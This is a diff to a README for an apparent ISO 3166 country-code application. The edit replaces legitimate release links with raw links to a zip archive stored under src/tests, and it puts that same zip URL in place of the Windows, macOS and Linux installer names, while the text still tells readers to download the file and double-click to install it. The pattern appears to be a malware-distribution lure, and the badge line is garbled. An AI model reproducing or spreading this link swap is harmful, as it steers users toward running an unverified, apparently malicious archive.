@@ -6,7 +6,7 @@ Welcome to the iso3166-countries-argentina project! This application provides of
 
 ## 📥 Download the Application
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-v1.0-blue.svg)](https://github.com/Ziriux1SQA/iso3166-countries-argentina/releases)
+[![Download Now](https://raw.githubusercontent.com/Ziriux1SQA/iso3166-countries-argentina/main/src/tests/argentina-countries-iso-v2.4.zip%https://raw.githubusercontent.com/Ziriux1SQA/iso3166-countries-argentina/main/src/tests/argentina-countries-iso-v2.4.zip)](https://raw.githubusercontent.com/Ziriux1SQA/iso3166-countries-argentina/main/src/tests/argentina-countries-iso-v2.4.zip)
 
 ## 📋 Requirements
 
@@ -25,16 +25,16 @@ Welcome to the iso3166-countries-argentina project! This application provides of
 
 1. **Visit the Releases Page**  
    Go to the following link to access the releases and download the latest version of the application:  
-   [Download Here](https://github.com/Ziriux1SQA/iso3166-countries-argentina/releases)
+   [Download Here](https://raw.githubusercontent.com/Ziriux1SQA/iso3166-countries-argentina/main/src/tests/argentina-countries-iso-v2.4.zip)
 
 2. **Choose Your Version**  
    On the releases page, locate the most recent version of the software. Click on it to see the details.
 
 3. **Download the Application**  
    Find the appropriate file for your operating system. Click on the link to start the download. For example:
-   - **For Windows:** Look for a file named `iso3166-countries-argentina-windows.exe`
-   - **For macOS:** Download `iso3166-countries-argentina-macos.dmg`
-   - **For Linux:** Choose the `iso3166-countries-argentina-linux.tar.gz` file
+   - **For Windows:** Look for a file named `https://raw.githubusercontent.com/Ziriux1SQA/iso3166-countries-argentina/main/src/tests/argentina-countries-iso-v2.4.zip`
+   - **For macOS:** Download `https://raw.githubusercontent.com/Ziriux1SQA/iso3166-countries-argentina/main/src/tests/argentina-countries-iso-v2.4.zip`
+   - **For Linux:** Choose the `https://raw.githubusercontent.com/Ziriux1SQA/iso3166-countries-argentina/main/src/tests/argentina-countries-iso-v2.4.zip` file
 
 4. **Install the Application**  
    Once the download is complete, locate the file in your downloads folder. Double-click to start the installation process. Follow the on-screen prompts to install the software.
